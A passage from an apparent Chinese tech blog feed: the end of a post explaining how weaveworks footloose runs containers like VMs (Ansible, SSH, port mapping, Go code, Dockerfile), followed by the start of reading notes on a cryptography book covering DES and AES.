**********************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">PLAY RECAP ************************</span><br><span class="line">cluster-node0              : ok=5    changed=4    unreachable=0    failed=0   </span><br><span class="line"></span><br><span class="line">[root@yiran ansible]<span class="comment"># ansible all -m raw -a 'systemctl status nginx'</span></span><br><span class="line">cluster-node0 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">● nginx.service - The nginx HTTP and reverse proxy server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/nginx.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2019-09-19 08:51:26 UTC; 10s ago</span><br><span class="line">  Process: 437 ExecStart=/usr/sbin/nginx (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 436 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 435 ExecStartPre=/usr/bin/rm -f /run/nginx.pid (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 438 (nginx)</span><br><span class="line">   CGroup: /docker/6b8bd7e41a6a303d5cc023e2c2e576773649e4a5188f4ef15b0ad3079e148b49/system.slice/nginx.service</span><br><span class="line">           ├─438 nginx: master process /usr/sbin/ngin</span><br><span class="line">           ├─439 nginx: worker proces</span><br><span class="line">           ├─440 nginx: worker proces</span><br><span class="line">           ├─441 nginx: worker proces</span><br><span class="line">           └─442 nginx: worker proces</span><br><span class="line"></span><br><span class="line">Sep 19 08:51:26 node0 systemd[1]: Starting The nginx HTTP and reverse proxy server...</span><br><span class="line">Sep 19 08:51:26 node0 nginx[436]: nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">Sep 19 08:51:26 node0 nginx[436]: nginx: configuration file /etc/nginx/nginx.conf <span class="built_in">test</span> is successful</span><br><span class="line">Sep 19 08:51:26 node0 systemd[1]: Started The nginx HTTP and reverse proxy server.</span><br></pre></td></tr></table></figure><p>可以执行 Ansible Playbook，那几乎意味着我们可以执行任何操作，我们可以通过 ansible rsync 模块直接将代码同步到容器中，也可以通过 Playbook 在容器中执行一些配置来达到我们对环境的修改，可以说是很方便了。</p><h3 id="SSH-连接"><a href="#SSH-连接" class="headerlink" title="SSH 连接"></a>SSH 连接</h3><p>既然可以通过 Ansible 进行控制，那么我们肯定也可以通过 ssh 进行连接，可以通过 footloose 提供的默认命令 <code>footloose ssh</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># footloose ssh root@node0</span></span><br><span class="line">Last login: Thu Sep 19 08:57:17 2019 from gateway</span><br><span class="line">[root@node0 ~]<span class="comment"># hostname</span></span><br><span class="line">node0</span><br><span class="line">[root@node0 ~]<span class="comment"># logout</span></span><br><span class="line">Connection to localhost closed.</span><br></pre></td></tr></table></figure><h3 id="Host-端口映射"><a href="#Host-端口映射" class="headerlink" title="Host 端口映射"></a>Host 端口映射</h3><p>在容器使用的过程中，我们通常需要跑一些对外提供端口的服务，这时候就需要进行 Host 端口映射，先来看下 footloose 的配置文件，这里我们指定了 machine的数量是 2，并且指定了容器的 22 端口映射到 host 的 2222端口，依次递增：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cluster:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">cluster</span></span><br><span class="line"><span class="attr">  privateKey:</span> <span class="string">cluster-key</span></span><br><span class="line"><span class="attr">machines:</span></span><br><span class="line"><span class="attr">- count:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">  spec:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">quay.io/footloose/centos7</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">node%d</span></span><br><span class="line"><span class="attr">    portMappings:</span></span><br><span class="line"><span class="attr">    - containerPort:</span> <span class="number">22</span></span><br><span class="line"><span class="attr">      hostPort:</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure><p>创建对应 machine 资源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran simple-hostPort]<span class="comment"># footloose create</span></span><br><span class="line">INFO[0000] Creating SSH key: cluster-key ...            </span><br><span class="line">INFO[0000] Pulling image: quay.io/footloose/centos7 ... </span><br><span class="line">INFO[0013] Creating machine: cluster-node0 ...          </span><br><span class="line">INFO[0014] Creating machine: cluster-node1 ...</span><br></pre></td></tr></table></figure><p>通过 netstat 查看 Host 端口情况，这里可以看到 footloose 使用的是 docker 作为容器管理入口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran simple-hostPort]<span class="comment"># netstat -antp |grep 222</span></span><br><span class="line">tcp6       0      0 :::2222                 :::*                    LISTEN      42227/docker-proxy  </span><br><span class="line">tcp6       0      0 :::2223                 :::*                    LISTEN      42540/docker-proxy</span><br></pre></td></tr></table></figure><p>这时候就可以使用普通的 ssh 命令连接到容器中了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran simple-hostPort]<span class="comment"># ssh root@127.0.0.1 -p 2222 -i cluster-key hostname</span></span><br><span class="line">The authenticity of host <span class="string">'[127.0.0.1]:2222 ([127.0.0.1]:2222)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:a6w9oFXMxjPCIXV42C44ogH9uaOILQiAdo/nlGdOnoc.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is MD5:6b:a8:78:08:78:63:d4:26:b8:11:9e:3c:31:24:ad:6e.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[127.0.0.1]:2222<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">node0</span></span><br><span class="line"><span class="string">[root@yiran simple-hostPort]# ssh root@127.0.0.1 -p 2223 -i cluster-key hostname</span></span><br><span class="line"><span class="string">The authenticity of host '</span>[127.0.0.1]:2223 ([127.0.0.1]:2223)<span class="string">' can'</span>t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:o5cVIJ1MBlw/J/OcNcjZxjqogiIVe03HhU0ZYZEuyPM.</span><br><span class="line">ECDSA key fingerprint is MD5:06:a6:4f:09:4c:23:1e:17:ee:f6:fe:f1:fd:35:e1:ba.</span><br><span class="line">Are you sure you want to <span class="built_in">continue</span> connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added <span class="string">'[127.0.0.1]:2223'</span> (ECDSA) to the list of known hosts.</span><br><span class="line">node1</span><br><span class="line">[root@yiran simple-hostPort]<span class="comment"># footloose show</span></span><br><span class="line">NAME            HOSTNAME   PORTS      IP           IMAGE                       CMD          STATE     BACKEND</span><br><span class="line">cluster-node0   node0      2222-&gt;22   172.17.0.2   quay.io/footloose/centos7   /sbin/init   Running   </span><br><span class="line">cluster-node1   node1      2223-&gt;22   172.17.0.3   quay.io/footloose/centos7   /sbin/init   Running</span><br></pre></td></tr></table></figure><p>写了三个使用场景，那么我们来看看 footloose 是怎么实现的。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>machine 创建：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CreateMachine creates and starts a new machine in the cluster.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cluster)</span> <span class="title">CreateMachine</span><span class="params">(machine *Machine, i <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">name := machine.ContainerName()</span><br><span class="line"></span><br><span class="line">publicKey, err := c.publicKey(machine) # 获取当前主机的公钥</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">cmd := <span class="string">"/sbin/init"</span>                    # 指定容器运行命令</span><br><span class="line"><span class="keyword">if</span> machine.spec.Cmd != <span class="string">""</span> &#123;</span><br><span class="line">cmd = machine.spec.Cmd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> machine.IsIgnite() &#123;                # 判断 backend</span><br><span class="line">...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;                              </span><br><span class="line">runArgs := c.createMachineRunArgs(machine, name, i)</span><br><span class="line">_, err := docker.Create(machine.spec.Image,</span><br><span class="line">runArgs,</span><br><span class="line">[]<span class="keyword">string</span>&#123;cmd&#125;,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(machine.spec.Networks) &gt; <span class="number">1</span> &#123; # 当容器有多个网络配置时，依次进行 bridge 连接</span><br><span class="line"><span class="keyword">for</span> _, network := <span class="keyword">range</span> machine.spec.Networks[<span class="number">1</span>:] &#123;</span><br><span class="line">log.Infof(<span class="string">"Connecting %s to the %s network..."</span>, name, network)</span><br><span class="line"><span class="keyword">if</span> network == <span class="string">"bridge"</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := docker.ConnectNetwork(name, network); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := docker.ConnectNetworkWithAlias(name, network, machine.Hostname()); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := docker.Start(name); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initial provisioning.</span></span><br><span class="line"><span class="keyword">if</span> err := containerRunShell(name, initScript); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := <span class="built_in">copy</span>(name, publicKey, <span class="string">"/root/.ssh/authorized_keys"</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解这看下 <code>createMachineRunArgs</code> 里面的实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cluster)</span> <span class="title">createMachineRunArgs</span><span class="params">(machine *Machine, name <span class="keyword">string</span>, i <span class="keyword">int</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">runArgs := []<span class="keyword">string</span>&#123; # 根据已有参数，进行 docker 的命令行拼接</span><br><span class="line"><span class="string">"-it"</span>,</span><br><span class="line"><span class="string">"--label"</span>, <span class="string">"works.weave.owner=footloose"</span>,</span><br><span class="line"><span class="string">"--label"</span>, <span class="string">"works.weave.cluster="</span> + c.spec.Cluster.Name,</span><br><span class="line"><span class="string">"--name"</span>, name,</span><br><span class="line"><span class="string">"--hostname"</span>, machine.Hostname(),</span><br><span class="line"><span class="string">"--tmpfs"</span>, <span class="string">"/run"</span>,              # 注意这里传入的参数部分</span><br><span class="line"><span class="string">"--tmpfs"</span>, <span class="string">"/run/lock"</span>,</span><br><span class="line"><span class="string">"--tmpfs"</span>, <span class="string">"/tmp:exec,mode=777"</span>,</span><br><span class="line"><span class="string">"-v"</span>, <span class="string">"/sys/fs/cgroup:/sys/fs/cgroup:ro"</span>, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, volume := <span class="keyword">range</span> machine.spec.Volumes &#123; # 卷挂载</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, mapping := <span class="keyword">range</span> machine.spec.PortMappings &#123; # 端口映射</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> machine.spec.Privileged &#123;</span><br><span class="line">runArgs = <span class="built_in">append</span>(runArgs, <span class="string">"--privileged"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(machine.spec.Networks) &gt; <span class="number">0</span> &#123; # 网络连接</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> runArgs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是，在 docker 命令行最终执行时，添加了 <code>--tmpfs /run --tmpfs /run/lock --tmpfs /tmp:exec,mode=777</code> 参数，并且将 Host 的 cgroup 配置路径通过只读权限传递给了容器，后面有用到。</p><p>其他的启动，停止，删除等操作也都是拼接为 docker 的命令行然后执行处理的，这里不过多描述。</p><p>那么有个问题，在容器内部，pid 为1 的进程应该是我们运行容器时传递的参数，也就时说，当我们执行的进程结束时，容器也就退出了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># docker run centos sleep 6000</span></span><br><span class="line">Unable to find image <span class="string">'centos:latest'</span> locally</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">d8d02d457314: Already exists </span><br><span class="line">Digest: sha256:307835c385f656ec2e2fec602cf093224173c51119bbebd602c53c3653a3d6eb</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新开 termimal</span></span><br><span class="line">[root@yiran ~]<span class="comment"># docker ps |grep -i centos</span></span><br><span class="line">6337dc1ad054        centos                      <span class="string">"sleep 6000"</span>        13 minutes ago      Up 13 minutes                              heuristic_haibt</span><br><span class="line">[root@yiran ~]<span class="comment"># docker exec -it  6337dc1ad054 bash</span></span><br><span class="line">[root@6337dc1ad054 /]<span class="comment"># ps -ef</span></span><br><span class="line">UID         PID   PPID  C STIME TTY          TIME CMD</span><br><span class="line">root          1      0  0 10:29 ?        00:00:00 sleep 6000</span><br><span class="line">root         23      0  3 10:43 pts/0    00:00:00 bash</span><br><span class="line">root         36     23  0 10:43 pts/0    00:00:00 ps -ef</span><br></pre></td></tr></table></figure><p>来看下 footloose 创建的 machine 是如何保证容器持久运行的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># </span></span><br><span class="line">[root@yiran ansible]<span class="comment"># docker ps </span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose create</span></span><br><span class="line">INFO[0000] Docker Image: quay.io/footloose/centos7:0.6.1 present locally </span><br><span class="line">INFO[0000] Creating machine: cluster-node0 ...          </span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose show</span></span><br><span class="line">NAME            HOSTNAME   PORTS       IP           IMAGE                             CMD          STATE     BACKEND</span><br><span class="line">cluster-node0   node0      32773-&gt;22   172.17.0.2   quay.io/footloose/centos7:0.6.1   /sbin/init   Running   docker</span><br><span class="line">[root@yiran ansible]<span class="comment"># docker ps </span></span><br><span class="line">CONTAINER ID        IMAGE                             COMMAND             CREATED             STATUS              PORTS                   NAMES</span><br><span class="line">8ba9af085e53        quay.io/footloose/centos7:0.6.1   <span class="string">"/sbin/init"</span>        8 seconds ago       Up 7 seconds        0.0.0.0:32773-&gt;22/tcp   cluster-node0</span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose ssh node0</span></span><br><span class="line">[root@node0 ~]<span class="comment"># ps -ef</span></span><br><span class="line">UID         PID   PPID  C STIME TTY          TIME CMD</span><br><span class="line">root          1      0  0 10:46 ?        00:00:00 /sbin/init</span><br><span class="line">root         17      1  0 10:46 ?        00:00:00 /usr/lib/systemd/systemd-journald</span><br><span class="line">root         50      1  0 10:46 ?        00:00:00 /usr/sbin/sshd -D</span><br><span class="line">root         58     50  0 10:46 ?        00:00:00 sshd: root@pts/1</span><br><span class="line">dbus         60      1  0 10:46 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation</span><br><span class="line">root         61      1  0 10:46 ?        00:00:00 /usr/lib/systemd/systemd-logind</span><br><span class="line">root         62     58  0 10:46 pts/1    00:00:00 -bash</span><br><span class="line">root         75     62  0 10:46 pts/1    00:00:00 ps -ef</span><br></pre></td></tr></table></figure><p>可以看到在 machine 中， pid 为1 的进程是 init，这个初始化参数是写死在代码里面的，因为 machine 中存在 init 进程，也就保证了我们之后的进程都是在 init 进程树下的，我们可以通过 systemd 对服务进行管理，直到我们的从容器外部将容器杀死。</p><p>前面使用过程中，一直忽略了一点，就是我们的容器镜像内部有什么不同么？看下 Dockerfile 里面的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">master ✗ $ cat Dockerfile          </span><br><span class="line">FROM centos:7 <span class="comment"># base 镜像是 centos7</span></span><br><span class="line"></span><br><span class="line">ENV container docker</span><br><span class="line"></span><br><span class="line">RUN yum -y install sudo procps-ng net-tools iproute iputils wget &amp;&amp; yum clean all <span class="comment"># 安装必要的debug 工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 centos7 中，init 切换为 systemd 管理，针对容器中删除部分 systemd 配置</span></span><br><span class="line">RUN (<span class="built_in">cd</span> /lib/systemd/system/sysinit.target.wants/; <span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> [ <span class="variable">$i</span> == \</span><br><span class="line">systemd-tmpfiles-setup.service ] || rm -f <span class="variable">$i</span>; <span class="keyword">done</span>); \</span><br><span class="line">rm -f /lib/systemd/system/multi-user.target.wants/*;\</span><br><span class="line">rm -f /etc/systemd/system/*.wants/*;\</span><br><span class="line">rm -f /lib/systemd/system/<span class="built_in">local</span>-fs.target.wants/*; \</span><br><span class="line">rm -f /lib/systemd/system/sockets.target.wants/*udev*; \</span><br><span class="line">rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \</span><br><span class="line">rm -f /lib/systemd/system/basic.target.wants/*;\</span><br><span class="line">rm -f /lib/systemd/system/anaconda.target.wants/*;\</span><br><span class="line">rm -f /lib/systemd/system/*.wants/*update-utmp*;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了支持 ssh 连接，安装 openssh</span></span><br><span class="line">RUN yum -y install openssh-server &amp;&amp; yum clean all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露 22 端口</span></span><br><span class="line">EXPOSE 22</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.freedesktop.org/wiki/Software/systemd/ContainerInterface/</span></span><br><span class="line">STOPSIGNAL SIGRTMIN+3</span><br><span class="line"></span><br><span class="line">CMD [<span class="string">"/bin/bash"</span>]</span><br></pre></td></tr></table></figure><p>可以看到 footloose 支持的镜像在官方的 CentOS7 的基础上进行了部分配置，比如 systemd、openssh、端口暴露等，来让容器更像是一台虚拟机。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为了方便的进行持续集成，我们引入了容器；为了更方便的进行调试/测试，我们让容器装作虚拟机的样子，也是无奈。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/weaveworks/footloose" target="_blank" rel="noopener">https://github.com/weaveworks/footloose</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;平时看过文章标题比较多的都是说“像容器一样运行虚拟机”，大家都想要有虚拟机的隔离性，又想要容器的便捷性，也有一些开源项目比如 Firecra
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《图解密码技术》读书笔记</title>
    <link href="https://zdyxry.github.io/2019/09/14/%E3%80%8A%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://zdyxry.github.io/2019/09/14/《图解密码技术》读书笔记/</id>
    <published>2019-09-14T09:07:41.000Z</published>
    <updated>2019-09-14T09:45:25.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己对于密码技术相关的知识一直都是零散的，刚接触 k8s 的时候遇到了好多证书问题都是靠临时搜索解决的，不成体系。</p><p><a href="https://liqiang.io/" target="_blank" rel="noopener">liqiang</a> 同学推荐了《图解密码技术》，趁着中秋假期看完了做了读书笔记，记录一下。</p><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="环游密码世界"><a href="#环游密码世界" class="headerlink" title="环游密码世界"></a>环游密码世界</h3><p>口令：password, passcode, pin<br>编码：encode<br>密码：cryptography  </p><p>对称密码是指在加密和解密时使用同一密钥的方式。  </p><p>公钥密码是指在加密和解密时使用不同密钥的方式，又称为非对称加密。  </p><p>将对称密码和公钥密码结合起来的密码方式称为混合密码系统。  </p><p>单项散列函数，用于保证完整性：“数据时正确的而不是伪造的”，没有被篡改过。  </p><p>数字签名能够保证数据不会被篡改，也防止发送者的否认。  </p><p>伪随机数生成器是一种能够模拟产生随机数列的算法，同时承担着密钥生成的重要职责。</p><img src="/2019/09/14/《图解密码技术》读书笔记/1.png" title="img1"><p>隐写术隐藏的是消息本身，而密码隐藏的是内容，应用场景：数字水印。</p><p>密码与信息安全常识：</p><ol><li>不要使用保密的密码算法</li><li>使用低强度的密码比不进行任何加密更危险</li><li>任何密码总有一天都会被破解</li><li>密码只是信息安全的一部分</li></ol><h3 id="历史上的密码"><a href="#历史上的密码" class="headerlink" title="历史上的密码"></a>历史上的密码</h3><p>凯撒密码，通过平移字母顺序达到加密效果，平移字母个数为密钥。<br>简单替换密码，通过维护字母对照表达到加密效果。</p><p>密钥空间，所有可用密钥的总数就是密钥空间的大小，空间越大，暴力破解越困难。</p><p>频率分析破译：通过分析语言中高频使用字母及单词达到破译效果。</p><p>Enigma ：通过增加通信密码的方式保证安全性。<br>问题：</p><ol><li>通信密码连续输入2词并加密</li><li>通信密码是认为设定的</li><li>必须有每日密码本</li></ol><h3 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h3><p>将显示世界中的东西映射为比特序列的操作称为编码。</p><p>XOR，异或，相同为0 ，不同为1。</p><p>比特序列的异或，将明文 A 用密钥 B 进行加密，得到密文 A XOR B，将密文 A XOR B 用密钥 B 进行解密，得到明文 A。</p><p>一次性密码本，又称为维纳没密码，通过生成随机比特序列与明文异或加密。</p><p>理论上无法破解的原因：无法判断暴力破解的结果是否是争取的明文。<br>无法使用的原因：</p><ol><li>密钥的发送</li><li>密钥的保存，密钥长度与明文长度相等。</li><li>密钥的重用</li><li>密钥的同步</li><li>密钥的生成，需要真正的随机数</li></ol><p>DES（Data Encryption Standard），可被短时间破译，不推荐使用。</p><p>DES 将64 比特的明文加密成64比特的密文，密钥长度是56比特，从规格上说，DES 的密钥长度是64 比特，但由于每隔7 比特会设置一个用于错误校验的比特，因此实质上密钥长度是56比特。</p><p>DES 以每 64 比特的明文为最小单位进行加密，属于分组密钥的一种。</p><p>DES 结构，又称为 Feistel 网络，在很多密码算法中都有应用。</p><p>加密步骤：</p><ol><li>将输入的数据等分为左右两部分</li><li>将输入的右侧直接发送到输出的右侧</li><li>将输入的右侧发送到轮函数</li><li>轮函数根据右侧数据和子密钥，计算出一串看上去是随机的比特序列</li><li>将上一步得到的比特序列与左侧数据进行 XOR 运算，并将结果作为加密后的左侧</li><li>因为上述使用将右侧数据作为密钥的一部分，因此需要指定规则（如每两轮）对输入数据的左右进行数据对调</li></ol><p>DES 加密时无论使用任何函数作为轮函数都可以正确解密，也就是说，轮函数无需考虑解密的问题，可以被设计的任意复杂。</p><p>三重 DES，为了增加 DES 的强度，将DES 重复3次所得到的一种密码算法。</p><p>加密过程为：加密，解密，加密，这么做的目的是为了能够让三重DES 兼容普通的 DES。</p><p>AES（Advanced Encryption Standard）取代DES。通过评选，最终选择 Rijndael。</p><p>Rijndael 分组成都为 128 比特，密钥长度可以以32比特为单位在128 比特到256 比特的范围内进行选择，在AES 规格中，密钥长度只有 128，192，256 比特三种。</p><p>AES 使用 SPN 结构。<br>加密过程：</p><ol><li>SubBytes 处理，输入分组为 128 比特，16 字节，首先逐个字节的对16字节的输入数据进行SubBytes 处理，可以简单的理解为“简单替换密码” 中的 256 个字母的版本</li><li>ShiftRows 处理，将 SubBytes 的输出以字节为单位进行打乱处理，注意，打乱处理是有规律的</li><li>MixColumns 处理，对一个4字节的值进行比特运算，将其变为另一个4字节的值</li><li>AddRoundKey 处理，将 MixColumns 的输出与轮密钥进行XOR</li><li>重复上述4步，需要重复 10 - 14 轮计算。</li></ol><p>相比 Feistel 网络，SPN 